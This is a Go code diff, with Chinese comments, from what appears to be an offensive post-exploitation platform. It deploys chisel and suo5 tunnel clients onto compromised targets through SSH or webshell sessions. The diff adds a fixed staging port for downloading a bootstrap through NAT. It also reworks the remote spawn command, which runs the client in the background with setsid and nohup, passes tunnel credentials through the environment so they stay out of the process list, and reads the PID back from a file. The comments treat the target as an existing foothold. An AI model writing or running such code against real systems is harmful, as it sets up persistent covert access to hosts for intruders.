@@ -44,6 +44,7 @@ type Manager struct {
 	sessions        *session.Registry
 	chiselPath      string // 空 = 二进制缺失，Deploy 返回明确错误
 	chiselClientDir string // 目标端 chisel client 二进制目录（按 <os>-<arch> 查找）
+	stagePort       int    // 固定 bootstrap 下载端口（0=随机），用于 NAT/公网映射目标
 	suo5Path        string // 空 = suo5 二进制缺失，suo5 适配器 Deploy 返回明确错误
 	suo5PayloadsDir string // 空 = payloads 目录缺失，同上
 	dataDir         string // 平台侧隧道工作目录（authfile/日志）
@@ -65,6 +66,9 @@ type Options struct {
 	ChiselPath string // ARTEX_CHISEL_PATH 或 data/tools/chisel；不存在时 Deploy 明确报错
 	// ChiselClientDir 是目标端 chisel client 二进制目录（ARTEX_CHISEL_CLIENT_DIR 或 data/tools/chisel-clients）。
 	ChiselClientDir string
+	// StagePort 是目标端 bootstrap 下载固定端口（ARTEX_TUNNEL_STAGE_PORT；0=随机）。
+	// NAT/公网映射场景必须设为已映射端口，否则目标无法访问随机临时端口。
+	StagePort int
 	// Suo5Path 是 suo5 CLI 路径（ARTEX_SUO5_PATH 或 data/tools/suo5);
 	// Suo5PayloadsDir 是 payload 目录（ARTEX_SUO5_PAYLOADS_DIR 或 data/tools/suo5-payloads)。
 	// 缺失时仅 suo5 适配器 Deploy 报明确错误，不影响 chisel。
@@ -84,7 +88,7 @@ func NewManager(o Options) (*Manager, error) {
 	}
 	m := &Manager{
 		store: o.Store, stage: o.Stage, sessions: o.Sessions,
-		chiselPath: o.ChiselPath, chiselClientDir: o.ChiselClientDir, dataDir: dir,
+		chiselPath: o.ChiselPath, chiselClientDir: o.ChiselClientDir, stagePort: o.StagePort, dataDir: dir,
 		suo5Path: o.Suo5Path, suo5PayloadsDir: o.Suo5PayloadsDir,
 		procs: map[int64]*exec.Cmd{},
 	}
@@ -376,32 +380,36 @@ func (m *Manager) chmodRemote(ctx context.Context, sess session.Session, p *Plan
 	return nil
 }
 
-// spawnRemote 远端后台拉起 client，经哨兵取回真实 pid。
+// spawnRemote 远端后台拉起 client，经 pid 文件取回真实 pid。
+// 注：SSH/webshell 的 Exec 会等待通道 EOF；若 chisel 子进程继承通道 fd，
+// 直接后台 + echo $! 可能让通道一直不关（实测 20s 超时）。这里把整个后台块
+// 的 stdout/stderr 重定向到 /dev/null，PID 先落文件，再单独 cat 读取。
 func (m *Manager) spawnRemote(ctx context.Context, sess session.Session, p *Plan) (int, error) {
 	if p.TargetOS == "windows" {
 		return m.spawnRemoteWindows(ctx, sess, p)
 	}
-	// AUTH 经 env 注入（chisel client 在 --auth 缺省时读 AUTH env)——auth 不出现在
-	// 目标机 ps cmdline;取舍：/proc/<pid>/environ 对同 uid 仍可见，目标已是立足点，可接受。
-	spawn := fmt.Sprintf(`cd %s && setsid env AUTH='%s:%s' nohup ./ch %s > %s 2>&1 < /dev/null & echo ARTEX_PID=$!`,
-		p.RemoteDir, p.AuthUser, p.AuthPass, strings.Join(p.ClientArgs, " "), p.RemoteLog)
-	stdout, _, err := sess.Exec(ctx, spawn, probeTimeout)
-	if err != nil {
+	pidFile := p.RemoteDir + "/client.pid"
+	spawn := fmt.Sprintf("cd %s && { setsid env AUTH='%s:%s' nohup ./ch %s > %s 2>&1 < /dev/null & echo $! > %s; } >/dev/null 2>&1",
+		p.RemoteDir, p.AuthUser, p.AuthPass, strings.Join(p.ClientArgs, " "), p.RemoteLog, pidFile)
+	if _, _, err := sess.Exec(ctx, spawn, probeTimeout); err != nil {
 		return 0, fmt.Errorf("拉起命令失败: %w", err)
 	}
-	_, after, found := strings.Cut(stdout, "ARTEX_PID=")
-	if !found {
-		return 0, fmt.Errorf("未取到远端 pid（哨兵缺失）: %s", detailOf(stdout))
+	deadline := time.Now().Add(6 * time.Second)
+	for {
+		stdout, _, err := sess.Exec(ctx, "cat "+pidFile+" 2>/dev/null", probeTimeout)
+		if err == nil {
+			fields := strings.Fields(strings.TrimSpace(stdout))
+			if len(fields) > 0 {
+				if pid, perr := strconv.Atoi(fields[0]); perr == nil && pid > 0 {
+					return pid, nil
+				}
+			}
+		}
+		if time.Now().After(deadline) {
+			return 0, fmt.Errorf("未取到远端 pid（pid 文件 %s 缺失/非法）", pidFile)
+		}
+		time.Sleep(200 * time.Millisecond)
 	}
-	pidStr := strings.Fields(after)
-	if len(pidStr) == 0 {
-		return 0, fmt.Errorf("远端 pid 解析失败： %s", detailOf(stdout))
-	}
-	pid, err := strconv.Atoi(strings.TrimSpace(pidStr[0]))
-	if err != nil || pid <= 0 {
-		return 0, fmt.Errorf("远端 pid 非法 %q", pidStr[0])
-	}
-	return pid, nil
 }
 
 // verify 等回连入口起来后做决定性验证。
